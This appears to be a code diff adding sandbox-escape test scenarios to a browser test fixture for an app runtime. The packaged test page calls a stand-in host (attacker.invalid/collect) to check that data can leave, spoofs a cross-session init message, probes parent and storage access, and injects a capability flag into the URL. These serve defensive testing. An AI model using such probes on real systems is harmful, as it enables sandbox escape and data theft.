@@ -3,7 +3,7 @@
   const scenario = new URLSearchParams(location.search).get("scenario") || "valid";
   const releaseId = `rel_${"1".repeat(32)}`;
   const expectedAppId = "com.example.browser";
-  const brokerGate = ["gate-on", "missing-permission", "review-denied", "revoked-after"].includes(scenario);
+  const brokerGate = ["gate-on", "missing-permission", "review-denied", "revoked-after", "security-escape", "gate-disabled-after", "cross-session"].includes(scenario);
   const manifest = {
     manifestVersion: 2, sdk: { apiVersion: "1" }, permissions: scenario === "missing-permission" ? [] : ["device.battery-status.read"],
     id: scenario === "wrong-manifest" ? "com.example.wrong" : expectedAppId,
@@ -34,7 +34,8 @@
   globalThis.__runtimeBrowserFixture = (async () => {
     const zip = new JSZip();
     if (scenario !== "legacy") zip.file("manifest.json", JSON.stringify(manifest));
-    zip.file("index.html", `<!doctype html><script>(async()=>{const out={type:'runtime-fixture-executed',webWindows:typeof window.WebWindows,context:typeof window.ProductionBrokerContext,verified:typeof window.VerifiedRuntimePackageIdentity};try{out.state=window.WebWindows.device.battery.getState();out.refresh=await window.WebWindows.device.battery.refresh()}catch(e){out.error=e&&e.code||e&&e.name||'unknown'}parent.postMessage(out,'*')})()<\/script><p>fixture</p>`);
+    const confusionAttempt = scenario === "cross-session" ? `const attackerChannel=new MessageChannel();window.postMessage({protocol:'webwindows-production-sdk-init-v1',version:1,sessionId:'session-B',snapshotId:'snapshot-B',channelId:'channel-B'},'*',[attackerChannel.port2]);` : "";
+    zip.file("index.html", `<!doctype html><script>(async()=>{${confusionAttempt}const out={type:'runtime-fixture-executed',webWindows:typeof window.WebWindows,context:typeof window.ProductionBrokerContext,verified:typeof window.VerifiedRuntimePackageIdentity,origin:location.origin};try{out.state=window.WebWindows.device.battery.getState();out.refresh=await window.WebWindows.device.battery.refresh()}catch(e){out.error=e&&e.code||e&&e.name||'unknown'}try{await fetch('https://attacker.invalid/collect');out.network='allowed'}catch(e){out.network=e&&e.name||'blocked'}try{out.storage=typeof localStorage}catch(e){out.storage=e&&e.name||'blocked'}try{out.parentApi=typeof parent.WebWindows}catch(e){out.parentApi=e&&e.name||'blocked'}try{window.WebWindowsNative={attacker:true};out.native=typeof window.WebWindowsNative}catch(e){out.native=e&&e.name||'blocked'}parent.postMessage(out,'*')})()<\/script><p>fixture</p>`);
     zip.file("icon.svg", "<svg xmlns='http://www.w3.org/2000/svg'/>");
     let bytes = await zip.generateAsync({ type: "uint8array", compression: "DEFLATE", platform: "UNIX" });
     const packageSha256 = await digest(bytes);
@@ -52,14 +53,18 @@
     };
   })();
   const realFetch = globalThis.fetch.bind(globalThis);
-  let releaseChecks = 0;
+  let releaseChecks = 0, featureChecks = 0;
   globalThis.fetch = async (input, init) => {
     const url = String(input);
-    if (url === "/data/config/runtime-features-v1.json" && brokerGate) return new Response(JSON.stringify({ contract:"webwindows-runtime-features-v1", version:1, productionCapabilityBrokerV1:true }), { status:200, headers:{ "Content-Type":"application/json" } });
+    if (url === "/data/config/runtime-features-v1.json" && brokerGate) {
+      featureChecks += 1;
+      const enabled = scenario !== "gate-disabled-after" || featureChecks === 1;
+      return new Response(JSON.stringify({ contract:"webwindows-runtime-features-v1", version:1, productionCapabilityBrokerV1:enabled }), { status:200, headers:{ "Content-Type":"application/json" } });
+    }
     if (url.startsWith("/api/runtime-release.asp")) {
       if (scenario === "revoked") return new Response(JSON.stringify({ ok: false, code: "release-not-active", message: "release denied" }), { status: 409, headers: { "Content-Type": "application/json" } });
       releaseChecks += 1;
-      if (scenario === "revoked-after" && releaseChecks > 1) return new Response(JSON.stringify({ ok:false, code:"release-not-active", message:"release revoked" }), { status:409, headers:{ "Content-Type":"application/json" } });
+      if (scenario === "revoked-after" && releaseChecks > 2) return new Response(JSON.stringify({ ok:false, code:"release-not-active", message:"release revoked" }), { status:409, headers:{ "Content-Type":"application/json" } });
       return new Response(JSON.stringify({ ok: true, identity: (await globalThis.__runtimeBrowserFixture).identity }), { status: 200, headers: { "Content-Type": "application/json" } });
     }
     if (url.startsWith("/api/function-package.asp")) return new Response((await globalThis.__runtimeBrowserFixture).bytes, { status: 200, headers: { "X-WebWindows-Package-SHA256": "f".repeat(64) } });
@@ -74,9 +79,14 @@
     document.body.dataset.batteryError = event.data.error || "";
     document.body.dataset.batteryState = event.data.state ? JSON.stringify(event.data.state) : "";
     document.body.dataset.batteryRefresh = event.data.refresh ? JSON.stringify(event.data.refresh) : "";
+    document.body.dataset.sandboxOrigin = event.data.origin || "";
+    document.body.dataset.network = event.data.network || "";
+    document.body.dataset.storage = event.data.storage || "";
+    document.body.dataset.parentApi = event.data.parentApi || "";
+    document.body.dataset.native = event.data.native || "";
   });
-  const query = scenario === "legacy"
-    ? `?appId=${expectedAppId}&version=1.0.0&entry=index.html`
-    : `?release=${releaseId}&appId=${expectedAppId}&version=1.0.0&entry=index.html`;
+  const query = ["legacy", "legacy-escalation"].includes(scenario)
+    ? `?appId=${expectedAppId}&version=1.0.0&entry=index.html&productionCapabilityBrokerV1=true`
+    : `?release=${releaseId}&appId=${expectedAppId}&version=1.0.0&entry=index.html${scenario === "gate-query-injection" ? "&productionCapabilityBrokerV1=true" : ""}`;
   history.replaceState(null, "", `${location.pathname}${query}&scenario=${scenario}`);
 })();
